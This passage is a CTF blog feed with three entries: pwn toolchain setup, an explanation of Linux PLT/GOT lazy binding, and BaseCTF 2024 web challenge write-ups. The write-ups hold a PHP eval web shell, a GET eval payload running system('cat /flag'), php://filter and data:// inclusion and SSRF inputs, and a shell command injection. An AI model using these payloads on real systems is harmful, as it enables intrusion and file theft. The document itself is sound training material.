function">sudo</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> pip-20.3.4 pip-20.3.4.tar.gz<span class="token function">sudo</span> pip2 config <span class="token builtin class-name">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple<span class="token function">sudo</span> pip3 config <span class="token builtin class-name">set</span> global.index-url https://mirrors.aliyun.com/pypi/simple<span class="token function">sudo</span> python2 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pippip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span class="token function">sudo</span> pip2 <span class="token function">install</span> pathlib2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置pwn环境"><a href="#配置pwn环境" class="headerlink" title="配置pwn环境"></a>配置pwn环境</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python2 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pwntools<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="pwndbg-Pwngdb"><a href="#pwndbg-Pwngdb" class="headerlink" title="pwndbg+Pwngdb"></a>pwndbg+Pwngdb</h3><p>这里我直接去<code>github</code>下载运行<code>setup.sh</code>会报错要求升级<code>python3</code>，所以直接把原来虚拟机里的打包复制过来了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://starrysky1004.github.io/pwnenv.zip<span class="token function">unzip</span> pwnenv.zip<span class="token function">rm</span> pwnenv.zip<span class="token comment">#pwndbg</span><span class="token builtin class-name">cd</span> pwndbg./setup.sh<span class="token comment">#Pwngdb</span><span class="token builtin class-name">cd</span> ~/<span class="token function">cp</span> ~/Pwngdb/.gdbinit ~/<span class="token function">vim</span> ~/.gdbinit<span class="token comment">#注释掉第一行 然后在第二行写入</span><span class="token builtin class-name">source</span> ~/pwndbg/gdbinit.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> patchelf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#glibc-all-in-one</span><span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git<span class="token builtin class-name">cd</span> glibc-all-in-onepython3 update_list<span class="token function">cat</span> list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pip3 <span class="token function">install</span> capstone filebytes unicorn keystone-engine ropper<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu-system"></a>qemu-system</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Ropgadget"><a href="#Ropgadget" class="headerlink" title="Ropgadget"></a>Ropgadget</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-H</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> ROPgadget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="one-gadget、seccomp-tools"><a href="#one-gadget、seccomp-tools" class="headerlink" title="one_gadget、seccomp-tools"></a>one_gadget、seccomp-tools</h3><p>这两个我感觉很随缘，没事运行一下看运气吧（</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span class="token function">sudo</span> gem <span class="token function">install</span> seccomp-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>推荐装个<code>oh-my-zsh</code>，主题多、好看，而且可以<code>Tab</code>选择文件以及回滚以前输入的命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;视频版：&lt;a href=&quot;https://www.bilibili.com/video/BV1YT1oYeEVd&quot;&gt;https://www.bilibili.com/video/BV1YT1oYeEVd&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;更新、安装vim&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux延迟绑定机制过程</title>
    <link href="https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/"/>
    <id>https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/</id>
    <published>2024-09-26T09:51:38.000Z</published>
    <updated>2024-09-26T13:46:46.158Z</updated>
    
    <content type="html"><![CDATA[<p>学<code>pwn</code>的时候了解到<code>linux</code>存在延迟绑定机制，延迟绑定之后<code>plt-&gt;got-&gt;函数真实地址</code>，这两天比赛遇到问题了才去关注了一下延迟绑定的具体过程</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>延迟绑定是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数不被调用就不进行绑定。延迟绑定机制可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序。</p><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>以调用<code>system</code>函数为例，汇编中<code>call system</code>时会调用<code>system_plt</code>，而<code>system_plt</code>中是三条汇编指令（不是<code>system_got</code>地址），其中第一条是<code>jmp system_got</code>，<code>system_plt</code>内容如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.plt:0000000000401050 ; int system(const char *command).plt:0000000000401050 _system         proc near               .plt:0000000000401050                 jmp     cs:off_403660;system_got.plt:0000000000401050 _system         endp.plt:0000000000401050.plt:0000000000401056 ; ---------------------------------------------------------------------------.plt:0000000000401056                 push    2.plt:000000000040105B                 jmp     sub_401020<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一次调用<code>system</code>时，<code>system_got</code>中并没有<code>system</code>的真实地址，而是<code>system_plt</code>中第二条指令的地址，即<code>push 2</code>之后跳转到<code>sub_401020</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/20gx 0x4036600x403660 <span class="token operator">&lt;</span>system@got.plt<span class="token operator">></span>:0x00000000004010560x00007ffff7e21c90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中函数<code>sub_401020</code>内容如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.plt:0000000000401020 sub_401020      proc near               ; CODE XREF: .plt:000000000040103B↓j.plt:0000000000401020                                         ; .plt:000000000040104B↓j ....plt:0000000000401020 ; __unwind &#123;.plt:0000000000401020                 push    cs:qword_403640.plt:0000000000401026                 jmp     cs:qword_403648.plt:0000000000401026 sub_401020      endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>qword_403640</code>和<code>qword_403648</code>存在于<code>got</code>表中，<code>got</code>表内容如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.got.plt:0000000000403638 _got_plt        segment qword public &#39;DATA&#39; use64.got.plt:0000000000403638                 assume cs:_got_plt.got.plt:0000000000403638                 ;org 403638h.got.plt:0000000000403638                 dq offset stru_403458.got.plt:0000000000403640 qword_403640    dq 0                    ;linkmap_ptr.got.plt:0000000000403648 qword_403648    dq 0                    ;dl_runtime_resolve.got.plt:0000000000403650 off_403650      dq offset puts          .got.plt:0000000000403658 off_403658      dq offset setbuf        .got.plt:0000000000403660 off_403660      dq offset system        .got.plt:0000000000403668 off_403668      dq offset printf        .got.plt:0000000000403670 off_403670      dq offset memset       .got.plt:0000000000403678 off_403678      dq offset read         .got.plt:0000000000403680 off_403680      dq offset __isoc99_scanf.got.plt:0000000000403688 off_403688      dq offset exit          .got.plt:0000000000403688 _got_plt        ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>got[0]</code>和<code>got[1]</code>（即<code>qword_403640</code>和<code>qword_403648</code>）分别是<code>linkmap</code>和<code>dl_runtime_resolve</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;2gx 0x4036400x403640:0x00007ffff7ffe1900x00007ffff7fe7bc0pwndbg&gt; x&#x2F;gx 0x00007ffff7fe7bc00x7ffff7fe7bc0 &lt;_dl_runtime_resolve_xsavec&gt;:0xe3894853fa1e0ff3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以函数<code>sub_401020</code>就是将<code>linkmap</code>入栈并跳转到<code>dl_runtime_resolve</code>寻找函数真实地址，找到真实地址之后会更新<code>system_got</code>内容为<code>system</code>函数的真实地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/gx 0x00000000004036600x403660 <span class="token operator">&lt;</span>system@got.plt<span class="token operator">></span>:0x00007fad32b74290<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>后续再次调用<code>system</code>函数时会通过<code>system_plt</code>跳转到<code>system_got</code>直接得到<code>system</code>函数的真实地址</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><code>plt</code>中是汇编指令，通过<code>jmp got</code>跳转到<code>got</code>表</li><li>第一次调用之前<code>got</code>表存放了<code>plt</code>第二条汇编指令的地址，如果没开<code>pie</code>那么这个地址是已知的</li><li>第一次调用时通过<code>jmp got[1]</code>调用<code>dl_runtime_resolve</code>并以<code>got[0]</code>为基址找到函数真实地址，所以在延迟绑定之前不能覆盖<code>got[0]</code>和<code>got[1]</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;学&lt;code&gt;pwn&lt;/code&gt;的时候了解到&lt;code&gt;linux&lt;/code&gt;存在延迟绑定机制，延迟绑定之后&lt;code&gt;plt-&amp;gt;got-&amp;gt;函数真实地址&lt;/code&gt;，这两天比赛遇到问题了才去关注了一下延迟绑定的具体过程&lt;/p&gt;
&lt;h2 id=&quot;概念&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="Linux" scheme="https://starrysky1004.github.io/categories/Linux/"/>
    
    
    <category term="linux" scheme="https://starrysky1004.github.io/tags/linux/"/>
    
    <category term="延迟绑定" scheme="https://starrysky1004.github.io/tags/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
    
  </entry>
  
  <entry>
    <title>2024BaseCTF-Web部分题解</title>
    <link href="https://starrysky1004.github.io/2024/09/26/2024basectf-web-bu-fen-ti-jie/2024basectf-web-bu-fen-ti-jie/"/>
    <id>https://starrysky1004.github.io/2024/09/26/2024basectf-web-bu-fen-ti-jie/2024basectf-web-bu-fen-ti-jie/</id>
    <published>2024-09-26T09:10:23.000Z</published>
    <updated>2024-09-26T09:26:03.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h2><p>直接查看源代码，注释里有<code>flag</code></p><h2 id="HTTP是什么呀"><a href="#HTTP是什么呀" class="headerlink" title="HTTP是什么呀"></a>HTTP是什么呀</h2><p><code>bp</code>抓包改<code>http</code>参数</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /?basectf=we1c%2500me  HTTP/1.1<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">challenge.basectf.fun:33834</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span><span class="token header-value">Base</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span><span class="token header-value">Base</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span><span class="token header-value">c00k13=i can't eat it</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">9</span></span>Base=fl@g<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会得到以下内容，<code>base64</code>解码即可</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">302</span> <span class="token reason-phrase string">Found</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">nginx/1.18.0</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Thu, 15 Aug 2024 07:05:41 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">X-Powered-By</span><span class="token punctuation">:</span> <span class="token header-value">PHP/7.4.27</span></span><span class="token header"><span class="token header-name keyword">Location</span><span class="token punctuation">:</span> <span class="token header-value">success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">0</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>客户端重定向</strong>：</p><ul><li>服务器在响应中返回一个带有302状态码的响应头，指示浏览器进行跳转。</li><li>例如，服务器端脚本通过<code>header(&quot;Location: success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==&quot;);</code>指令将HTTP响应状态设置为302，然后浏览器会自动访问<code>success.php?flag=QmFzZUNURns1N2Y2MGNlYi00Y2UxLTQ5Y2UtYjNhMC0xMTc3NTliODhkNmZ9Cg==</code>页面。</li></ul><h2 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>get</code>传参给<code>eval</code>执行，直接传<code>system(&#39;cat /flag&#39;);</code>，即<code>url?DT=system(&#39;cat /flag&#39;);</code></p><h2 id="EncirclingGame"><a href="#EncirclingGame" class="headerlink" title="EncirclingGame"></a>EncirclingGame</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">A simple game<span class="token punctuation">,</span> enjoy it <span class="token keyword">and</span> get the flag when you complete it<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>纯游戏题，通关得到<code>flag</code></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>文件上传漏洞，没有检测文件类型，直接传个木马，然后蚁剑连接</p><p><code>test.php</code>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Aura酱的礼物"><a href="#Aura酱的礼物" class="headerlink" title="Aura酱的礼物"></a>Aura酱的礼物</h2><p><code>data</code>伪协议 <code>ssrf</code> 文件包含</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Aura 酱，欢迎回家~</span><span class="token comment">// 这里有一份礼物，请你签收一下哟~</span><span class="token variable">$pen</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pen'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$pen</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Aura'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这是 Aura 的礼物，你不是 Aura！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span><span class="token variable">$challenge</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'challenge'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http://jasmineaura.github.io'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'这不是 Aura 的博客！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$blog_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$challenge</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$blog_content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'已经收到Kengwang的礼物啦'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请去博客里面写下感想哦~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span><span class="token variable">$gift</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gift'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$gift</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>post</code>参数：<code>pen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@challenge.basectf.fun:21758/&amp;gift=php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="一起吃豆豆"><a href="#一起吃豆豆" class="headerlink" title="一起吃豆豆"></a>一起吃豆豆</h2><p><code>index.js</code>里有一行<code>context.fillText(_LIFE ? atob(&quot;QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==&quot;) : &#39;GAME OVER&#39;, this.x, this.y);，base64</code>解码得到<code>flag</code></p><h2 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h2><p>系统命令执行，不会直接显示，所以放到其他文件里再访问文件：<code>cmd=cat /flag &gt; ./1.txt</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="easy-ser"><a href="#easy-ser" class="headerlink" title="easy_ser"></a>easy_ser</h2><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">re</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$chu0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"I can not believes!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">chu0</span><span class="token operator">-></span><span class="token variable">$nononono</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$kw</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dt</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"lalalla"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">kw</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ALL Done!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">pwn</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$dusk</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$over</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dusk</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"gods"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"什么，你竟敢不认可?"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">over</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Misc</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$nothing</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Crypto</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"happy happy happy!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are over!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ser'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" 